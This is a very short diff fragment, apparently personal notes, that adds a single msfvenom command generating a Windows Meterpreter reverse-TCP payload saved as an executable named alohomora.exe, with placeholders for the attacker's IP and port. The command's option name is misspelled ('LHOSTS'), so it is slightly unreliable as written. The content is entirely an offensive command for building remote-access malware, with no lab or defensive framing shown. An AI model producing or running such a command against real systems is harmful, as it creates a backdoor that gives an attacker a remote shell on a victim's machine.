@@ -1,0 +1,4 @@
+
+**commands 
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOSTS=<attackersIP> LPORT=<LPORT> -o Desktop/alohomora.exe
